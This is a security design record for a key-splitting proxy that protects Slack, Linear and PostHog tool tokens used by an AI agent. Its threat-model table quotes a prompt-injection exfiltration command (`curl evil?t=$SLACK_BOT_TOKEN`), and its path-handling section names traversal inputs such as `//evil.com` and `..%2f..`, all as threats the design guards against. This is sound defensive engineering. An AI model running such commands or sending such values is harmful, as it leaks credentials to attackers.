# ADR-002: Non-LLM bearer credentials ("tool keys")

- **Status:** Proposed
- **Date:** 2026-10-22, revised 2026-10-24 after the pre-merge review
- **Epic:** [WOR-968](https://linear.app/plumbusai/issue/WOR-968), docs ticket [WOR-987](https://linear.app/plumbusai/issue/WOR-987)
- **Evidence:** [research/non-llm-keys/README.md](../research/non-llm-keys/README.md). **Delivery:**
  [planning/wor-968-tool-keys.md](../planning/wor-968-tool-keys.md).

`CONTRIBUTING.md` asks for a design discussion before adding a provider adapter. This ADR is that discussion.

## Terms

| Term | Meaning |
|---|---|
| shard-A / shard-B | The two halves of a split key. Shard-A stays in `.env` and looks like a key; shard-B is sealed on the box |
| uniform 401 | The proxy's one byte-identical refusal (`_uniform_401`), so a caller can't tell *why* it was refused |
| passthrough | The single new protocol: forward a tool-key request to its vendor as sent |
| Mappy | The first design partner: an AI agent running on a VM |
| F1–F8 | The epic's eight features (lock, exact forwarding, leak hardening, no LLM billing, undo, agent trust domain, operation policy, budgets) |
| Gate A / Gate B | Pre-code checks: A lists what actually leaks from Mappy; B captured how the real SDKs talk on the wire |
| PR0a…R1 | The delivery slices in the plan |

## Context

Worthless splits an LLM API key and rebuilds it inside a local proxy only after the rules engine approves the
request. The headline is a hard spend cap for LLM keys.

An AI agent's `.env` also holds the keys for the tools it drives: Slack, Linear, PostHog. Today `lock` doesn't
recognise them and prints "No unprotected API keys found." That is a false all-clear next to a live Slack token.

An outside spike proposed a pass-through adapter and would have failed on its first live request. The research
note lists its nine gaps, and the SDK wire capture (Gate B) behind the decisions below.

**Owner decisions (2026-10-22)** this ADR builds on:

1. Product feature, with Mappy as first design partner.
2. Build only for the **leaked-file** threat. Prompt injection and runaway use get tickets only (F7, F8).
3. v1 covers **Slack, Linear and PostHog `phx_`**. After Gate B, PostHog is limited to direct API use (see
   "PostHog in v1").
4. A separate trust domain (F6) **gates Mappy go-live**.
5. Ship as **experimental**. "Hard spend cap for LLM keys" stays the headline.
6. Whether Mappy uses Slack Socket Mode (`xapp-`) is answered by the leak inventory (Gate A).

## Decision

### D1. A curated vendor list, defined in code

- The prefix table in `cli/key_patterns.py` gains `slack: [xoxb-, xoxp-]`, `linear: [lin_api_]`,
  `posthog: [phx_]`. A key is a tool key **only** because its prefix is in that table.
- Each tool vendor's upstream URL lives **in code next to that table**, not in `providers.toml`. No TOML entry,
  bundled or user, can declare `passthrough`, and a user entry can't shadow a tool vendor's URL.
- The new prefixes, and the refused secret prefixes in D7, join `KEY_PATTERN`, so `worthless scan`, the
  pre-commit hook, the code scanner, the OpenClaw audit and log redaction report them for every user, flag or
  not. That is intended: they are secrets. `phc_` does not join, because it is public.

**Why:** passthrough skips LLM metering and the LLM error sanitizer, so a config edit must never be able to put
an AI key in that mode. Keeping the vendor URLs in code also removes the conflict with D8. A user-declared
generic protocol can come later ([WOR-998](https://linear.app/plumbusai/issue/WOR-998)).

### D2. One `passthrough` protocol, stored at lock time

- A tool key's row stores `shards.provider = "passthrough"`; the alias is vendor-named (`slack-3f9a1c2e`). No
  DB migration. `lock` carries the vendor and the protocol as separate values internally, because the prefix
  detection and the `*_BASE_URL` naming need the vendor.
- The proxy looks up a small protocol table by the stored protocol. An unknown protocol gets the uniform 401
  before decrypt. The alias is parsed once from the raw path, before the branch.
- The alias is parsed once, by today's parser, for every request. After the row is fetched, a passthrough
  request takes its API path from the ASGI `raw_path` after the `/<alias>` prefix (the two must agree); LLM
  aliases keep today's path and adapter dispatch unchanged.
- A passthrough request is forwarded as sent: method, raw path (from the ASGI `raw_path`), query string and
  body bytes. Base URL and path are joined as plain strings, never with `urljoin`, so `//evil.com` after the
  alias stays on the vendor's host.
- Refused with the uniform 401, before the rules run and before decrypt: `.` or `..` segments in any `%2e` case
  mix, including after one round of percent-decoding (`..%2f..`), and any `\` or `%5c`. httpx collapses `..`,
  which would let a path escape the base.
- Decrypt and reconstruct go through one shared helper in `proxy/app.py`, so key reconstruction still has a
  single call site after the gate.

**Why one protocol:** the vendors differ only in auth form and base URL, both known at lock time. Per-vendor
code earns its place only once we police operations (F7).

### D3. Mirrored auth

- The proxy accepts shard-A as `Authorization: Bearer <shard-A>` or raw `Authorization: <shard-A>`, and sends
  the real key upstream **in the same form**. Basic auth, `x-api-key`, and values with spaces get the uniform
  401 before decrypt.
- Both inbound credential headers (`authorization`, `x-api-key`) are removed before the real one is set. No
  other header is added.

**Why:** Slack and PostHog use Bearer; Linear personal keys go raw. Gate B saw no SDK put the secret anywhere
else. Mirroring needs no per-vendor auth setting, so there is no setting that could aim the key at another
header. A client that sends Slack's token as a POST body `token=` field (allowed by Slack, never done by
`slack_sdk`) has no `Authorization` header and gets the uniform 401.

### D4. Not billed like an LLM; the rate limit is the brake until request budgets

- Spend cap and token budget are skipped for passthrough: no reservation, no usage extraction, no spend rows,
  no usage warning. A passthrough row's spend cap is NULL. The skip is derived from the stored protocol, which
  D1 ties to the code table, so no config edit can make an AI key unmetered.
- The rate limit still applies and still returns 429 + `Retry-After`. **Today it is keyed on (alias, client
  IP), and uvicorn trusts `X-Forwarded-For` from `127.0.0.1`, so a local client can dodge it by changing that
  header on every call** ([WOR-1010](https://linear.app/plumbusai/issue/WOR-1010)). For passthrough, PR2 keys it
  on the alias alone.

**Why:** a Slack response has no `usage`. Today the default 1B-token cap plus the 128k floor on unreadable usage
bills each call as 128,000 tokens, so call ~7,813 gets a 402. The "charge the maximum when usage is unreadable"
rule stops cap-dodging on AI keys, so it stays for them.

**Accepted risk:** anyone on the box who holds the *active* shard-A can use the key through the proxy, limited
only by the per-alias rate limit (once PR2 lands). This is non-goal #9 ("replay of the currently active shard-A")
with a bigger blast radius. It stays that way until request budgets ship (F8a,
[WOR-978](https://linear.app/plumbusai/issue/WOR-978)), which need a pre-gate shard-A check first
([WOR-991](https://linear.app/plumbusai/issue/WOR-991)). The public docs must say so (PR4a).

### D5. Verbatim upstream errors; the LLM sanitizer is unchanged

- For passthrough, the upstream status, body, `Retry-After` and every `X-RateLimit-*` header reach the client as
  sent, so each SDK's own error handling and back-off still work.
- Still enforced:
  - an upstream 3xx becomes a 502, with no `Location` rewrite (Gate B: no SDK flow needs one, a 302 turns a POST
    into a body-less GET, and sync `slack_sdk` keeps the Bearer header across hosts);
  - `Set-Cookie` is stripped; `Cookie`, `Forwarded` and `X-Forwarded-*` are not forwarded upstream;
  - the proxy never retries: one inbound request, one upstream call;
  - a buffered body over the cap (about 10 MiB, any status) becomes a 502; a streamed body that overflows after
    headers are sent aborts the connection, never a truncated 200;
  - if a buffered response contains the real key's exact bytes, the client gets a 502.
- This alias's shard-A anywhere else in the request (path, query, any other header, body) gets the uniform 401
  before decrypt. A request with `Content-Encoding` is refused. The match is on this alias's shard-A bytes,
  never a token pattern: PostHog sends the public `?token=phc_…` on every call.
- The proxy's **own** refusals stay byte-identical to the uniform 401. Its own 429/502/503/504 carry an
  `x-worthless-` marker header, so they can't be mistaken for the vendor's; upstream copies of that header are
  stripped as today.
- `_sanitize_upstream_error` keeps doing what it does for LLM aliases (unmasking those is WOR-729).

**Why:** the sanitizer turns "channel not found" and "rate limited" into the same opaque body, and the SDK can't
recover. A verbatim error tells the caller nothing it couldn't learn by making the same call through the proxy.
Scrubbing other secrets out of responses is F7 ([WOR-977](https://linear.app/plumbusai/issue/WOR-977)).

### D6. `<STEM>_BASE_URL` naming and a one-line client snippet

- For passthrough only, the proxy URL goes in `<STEM>_BASE_URL`, the key's variable name minus its credential
  suffix (`SLACK_BOT_TOKEN` → `SLACK_BOT_BASE_URL`, `LINEAR_API_KEY` → `LINEAR_BASE_URL`). PR3 pins the suffix
  list in tests. If that variable already exists, lock refuses; it never writes `OPENAI_BASE_URL` for a tool
  key, and the URL has no `/v1`.
- `lock` prints the one line to paste, with the vendor default as the fallback:

  ```python
  WebClient(token=..., base_url=os.environ.get("SLACK_BOT_BASE_URL", "https://slack.com/api/"))
  ```

- Snippet details from Gate B: on a host with `HTTPS_PROXY`, the async Slack snippet also sets
  `client.proxy = None` (it ignores `NO_PROXY`). `@linear/sdk` allows plain `http://` only for `localhost`,
  `127.0.0.1` and `[::1]`, so `lock` warns when `WORTHLESS_PROXY_HOST` isn't loopback for a Linear key.
- **Limit:** one base URL per vendor covers only clients we configure. Slack file downloads
  (`files.slack.com`) and Linear file downloads (`uploads.linear.app`) send the key to a second host; an MCP server
  that hard-codes the vendor URL, or a hosted MCP (PostHog's runs on PostHog's servers), can't be pointed at a
  local proxy. Each of those sends shard-A straight to the vendor and fails. Gate A lists every consumer and
  stops if one can't take a base URL.

**Why:** the SDKs take a base URL as a constructor argument; Gate B confirmed none reads one from the
environment. So "no code changes" isn't true for tool keys; "one line per tool" replaces it. The vendor default
in the snippet makes `unlock` a rollback with **no code change, but one agent restart**: unlock removes the
variable and retires shard-A, and the running agent keeps the old values in its environment (every call 401s,
and may raise a retired-key alarm) until it restarts.

### D7. Experimental, behind `--tool-keys`

- `worthless lock --tool-keys` locks tool keys. Without the flag, `lock` **warns** about each tool key it finds
  and names the flag. It never prints "No unprotected API keys found." while a tool key is in the file.
- Tokens v1 can't protect are refused **with a reason** (table below). A refused *secret* left in the file
  suppresses the "You're protected" verdict, reusing the mechanism that already does this for skipped OAuth
  tokens (`worthless-7jn2`). `phc_` is refused without suppressing the verdict, because it is public.
- **A second lock on an already-locked `.env` works.** Today `_detect_already_locked_env` refuses a lock when
  *any* `*_BASE_URL` already points at the proxy, which blocks "lock the OpenAI key, later lock the Slack key".
  PR3a narrows that check to the `*_BASE_URL` variables of the keys being locked. Replacing the heuristic with a
  value-signature check stays [WOR-693](https://linear.app/plumbusai/issue/WOR-693).
- Tool-key aliases never reach the OpenClaw integration (apply, capture or scrub). OpenClaw configures LLM
  providers, and a passthrough entry with a `/v1` URL would break it.
- After a tool-key lock, the "Next:" line points at the snippet, not at `wrap`. `wrap` skips passthrough aliases
  in v1 ([WOR-993](https://linear.app/plumbusai/issue/WOR-993)).
- README positioning changes only after Mappy meets its success criteria (PR4b).

**Which tokens v1 locks or refuses** (the one list; the plan and research point here):

| Token | What it is | v1 | Why |
|---|---|---|---|
| `xoxb-` | Slack bot token | **Lock** | Static bearer over HTTPS |
| `xoxp-` | Slack user token | **Lock** (not used in the Mappy rollout) | Same wire shape; acts as a human |
| `lin_api_` | Linear personal API key | **Lock** | Raw `Authorization` |
| `phx_` | PostHog personal API key | **Lock**, direct API use only | Bearer on every request |
| `xapp-`, `xoxe.xapp-` | Slack app-level token (Socket Mode) | Refuse, suppress verdict | A WebSocket, not request/response |
| `xoxe.xoxb-`, `xoxe.xoxp-`, `xoxe-` | Slack rotating access and refresh tokens | Refuse, suppress verdict | Change every 12h; rotation can't be turned off once on |
| `xwfp-` | Slack workflow ("just in time") token | Refuse, suppress verdict | Short-lived by design |
| `SLACK_SIGNING_SECRET` (by variable name; no prefix) | HMAC key for inbound requests | Refuse, suppress verdict | Not a bearer credential |
| `lin_oauth_` | Linear OAuth access token | Refuse, suppress verdict | Refresh-based |
| `phs_` | PostHog project secret key | Refuse, suppress verdict | Used by the library mode that waits for WOR-1000 |
| `phc_` | PostHog project key | Refuse, verdict unaffected | Public by design |

### D8. A tool key goes only to its own vendor

- At lock time a tool key resolves to **its own vendor's URL from the code table (D1), and nothing else**. Lock
  refuses a `*_BASE_URL` naming any other URL, including another tool vendor's (a Slack token can't be pointed
  at Linear) or an LLM provider's. The OpenClaw `baseUrl` route, a URL carried forward from an earlier row, and
  the hard-coded `api.openai.com/v1` fallback are never used for a tool key.
- The same lookup closes today's LLM hole, where any *registered* URL is accepted whatever its protocol (an
  Anthropic key can be routed to OpenAI): an LLM key's `*_BASE_URL` must match its protocol.
- At request time, the proxy checks a passthrough row's stored URL against the code table (exact match) and
  answers a mismatch with the uniform 401 before decrypt. LLM rows keep today's behaviour; their re-check is
  worthless-rzi1. The URL validator moves out of `cli/commands/lock.py` into a neutral module, so the proxy never
  imports the CLI (which would load the splitter, WOR-309). The test switch for a local upstream is settable only
  from tests, never from the environment.

**Why:** all three vendors share the `passthrough` protocol, so matching on protocol alone would still let a
Slack token reach Linear. Vendor-exact matching is the only rule that keeps the real key on its route.

### D9. The F6 trust-domain recipe gates design-partner go-live

Mappy does not go live until R1 ([WOR-986](https://linear.app/plumbusai/issue/WOR-986)) is applied and its
verification script passes **as the agent user**:

- the agent runs under its own uid or container;
- `~/.worthless` and the Fernet key are unreadable to it;
- the Fernet key lives **off any disk a VM snapshot or backup captures** (a keychain, a separate volume or a
  remote store), or Mappy accepts that a VM snapshot holds both halves;
- the proxy listens on loopback only;
- `worthless unlock` fails as the agent user;
- outbound traffic from the agent's uid to the vendor API hosts is blocked and logged. This is **required**,
  not optional: it stops bypasses and is the only way to count them. `files.slack.com` stays reachable for
  uploads, which carry no key; a Slack file *download* there would carry shard-A and isn't counted, which is why
  Gate A must show Mappy doesn't download vendor files.

The script expects `EACCES` on the store, a failing unlock, the Fernet key's location matching the snapshot rule
above, a loopback-only listener, a blocked direct call, and a working proxy call.

**Why:** a separate user stops a hijacked agent from reading the other half. It does not change what a VM-level
snapshot holds. Without both, the v1 promise fails on exactly the machine we're building it for.

## PostHog in v1: direct API use only

Gate B found that `posthog-python` sends secret-key calls (`Bearer phx_…`, e.g. feature-flag definitions) and
**keyless** analytics (capture, `/flags`, automatic `$feature_flag_called` events, carrying only the public
`phc_` key) to the **same** host. Pointed at the proxy, the keyless events would get the uniform 401, and
PostHog's SDK never raises, so nobody would notice.

**Decision (owner, revised 2026-10-22):**

- **In v1:** `phx_` for **direct API use**, such as agent analytics queries or a locally run PostHog MCP server
  that accepts a host setting, where every request carries `Authorization: Bearer`. The hosted PostHog MCP
  (`mcp.posthog.com`) can't go through a local proxy.
- **Not yet supported:** `posthog-python`'s mixed mode. The tool-keys docs say in one line that feature flags in
  the PostHog Python library aren't supported yet. Forwarding keyless requests untouched for PostHog aliases
  only is [WOR-1000](https://linear.app/plumbusai/issue/WOR-1000).
- **Caveat:** Gate B exercised only the library route. PR3's end-to-end test is the first coverage of the
  direct-API path, and it is a required check before PostHog's rollout week, along with a real-account host
  check (`us.` vs `eu.posthog.com`).

## When the protection holds

| Leak path | Protected? |
|---|---|
| `.env`, git history, CI log, transcript or screenshot leaves the box | **Yes.** It holds only shard-A, which the vendor rejects, as long as the proxy can't be reached from where the file lands (loopback only). |
| Prompt injection sends the agent's env off the box (`curl evil?t=$SLACK_BOT_TOKEN`) | **Yes, with F6.** Shard-A is useless off the box. Without F6 the same injection can copy `~/.worthless` and the Fernet key too. |
| A backup of the agent user's home directory | **Yes, with F6**, because the key store is outside that home. |
| A VM-level snapshot or disk backup | **No**, unless the Fernet key lives off that disk (D9). One snapshot otherwise holds both halves. |
| Code running on the box *uses* the key through the proxy | **No.** Limited only by the rate limit until request budgets (F8). Per-operation policy is F7. |
| A vendor response echoes a secret | A **buffered** response with the real key's exact bytes → 502; streamed responses aren't checked. Other secrets: **no**, until F7. |

## Alternatives considered

We read the code of four comparable open-source proxies (research note, section 3). None of the three we could
read fully turns an upstream 3xx into an error (the fourth, tokenizer, probably doesn't either), none of the four
rejects dot segments before using the key, and none tests against live Slack.
Agent Vault and OneCLI retry on a 401; Secretless re-encodes the query. Gate B is the evidence that the 3xx and
raw-query rules matter for these SDKs.

| Alternative | How it compares |
|---|---|
| **`op run`** (a secret manager that injects env at exec) | The secret is safe at rest, but at runtime the real key sits in the process env and anything that captures it. With worthless those hold shard-A. Complementary: a vault can keep the original token for recovery. |
| **Egress proxy that injects the credential** (Agent Vault, Secretless, Aembit, Managed Agents placeholders) | **Roughly equal** on the leaked-file threat. They need `HTTPS_PROXY` (often with a trusted interception CA), a sidecar or a hosted platform; worthless needs one line per vendor and no CA, and reuses machinery it already has. None stops a compromised client using the key. If a user already runs one, worthless adds little for tool keys. |
| **Slack token rotation** | A leaked token dies within 12h, but the refresh replaces the value lock split, and rotation can't be turned off once on. Refused with a reason; teams already rotating should keep rotating. |
| **Scoped tokens** | Always do it (rollout step 1). Limits what a leaked token can do, not whether it works. |
| **One adapter per vendor** (the spike) | More code for differences that are data (auth form, URL). Rejected. |
| **Pin the auth form per alias** (tokenizer, Agent Vault) | Header name and upstream are fixed either way, so mirroring can't aim the key anywhere new. Kept mirroring; revisit if a vendor gives the two forms different meanings. |
| **A second factor beyond shard-A** (tokenizer) | On a loopback proxy it sits on the same box as shard-A, so it adds nothing against a leaked file. F6 is the on-box answer. |
| **User-declared generic protocol now** | A config edit could make an AI key unmetered. Deferred to WOR-998. |
| **Do nothing** | Leaves the false all-clear and live tool tokens in `.env`. Rejected by owner decision 1. |

## Consequences

**Good**

- A leaked `.env`, git history, CI log, transcript or screenshot holding a Slack, Linear or PostHog `phx_` key is
  dead off the box.
- `lock` stops issuing a false all-clear when tool keys are present.
- The LLM paths don't change: path dispatch, the sanitizer, metering and caps stay; the existing
  openai/anthropic/openrouter lock tests stay green unchanged. D8 also closes today's cross-protocol routing hole.
- Bugs found on the way ship as PR0 for LLM users too, plus the rate-limit bypass (WOR-1010).

**Costs and accepted risks**

- One code line per vendor, and only for clients we configure (D6). Rollback is no code change but one agent
  restart.
- Someone on the box holding the active shard-A is limited only by the per-alias rate limit until F8a.
- The proxy becomes a single point of failure for the agent's tools: `worthless service install` with a restart
  policy and health check, plus an outage drill, are part of the rollout. Passthrough gets its own HTTP client so
  a slow vendor can't starve LLM requests of connections.
- The proxy handler gains a second branch. The gate-order guard becomes an AST check that every call to the
  shared reconstruct helper comes after `evaluate` and the denial return.
- If Mappy depends on Socket Mode, rotating tokens, or a client that can't take a base URL, v1 doesn't protect
  that token. Gate A answers this before code.

**Neutral**

- No DB migration. `enroll` and `wrap` don't support tool keys in v1
  ([WOR-992](https://linear.app/plumbusai/issue/WOR-992), [WOR-993](https://linear.app/plumbusai/issue/WOR-993)).

## Out of scope

Besides the refused tokens in D7:

| Item | Why |
|---|---|
| `posthog-python` mixed mode | Keyless events would get the uniform 401; [WOR-1000](https://linear.app/plumbusai/issue/WOR-1000) |
| Other rotating or OAuth tokens, and OAuth flows | Refresh would have to live in the proxy |
| `AIza` Google keys | Commonly sent as a `?key=` query parameter |
| GCP service-account JSON | Not a bearer token; it mints OAuth tokens, often over gRPC |
| Webhooks (e.g. Slack incoming-webhook URLs) | The secret is in the URL path ([WOR-997](https://linear.app/plumbusai/issue/WOR-997)) |
| Browser clients / CORS | Shard-A would ship to the browser, and the proxy is loopback-only |
| Per-operation policy, approvals, response scrubbing | F7 ([WOR-977](https://linear.app/plumbusai/issue/WOR-977)) |
| Request budgets, pause, audit log | F8 ([WOR-978](https://linear.app/plumbusai/issue/WOR-978)) |

## Gates before code

- **Gate A** ([WOR-969](https://linear.app/plumbusai/issue/WOR-969)) lists Mappy's real leak artifacts, every
  consumer of each token and the hosts it calls, and which tokens and scopes exist (rotation on? Socket Mode?).
  **Stop and revisit this ADR** if partial files leaving the box are not the main leak path, or if a consumer
  can't take a base URL.
- **Gate B** ([WOR-970](https://linear.app/plumbusai/issue/WOR-970)) is done; the plan tracks its live leg.
- **Wording:** the owner approves "one line per tool" in place of "no code changes" for tool keys.

## References

- `docs/security.md`, "Threat model: non-goals" (#1 compromised client, #9 replay of the active shard-A)
- `CONTRIBUTING-security.md`: SR-03 (gate before reconstruct), SR-05 (logging denylist), SR-09 (shard-A never
  at rest in the proxy), SR-11 (client transport only), SR-12 (format-preserving split)
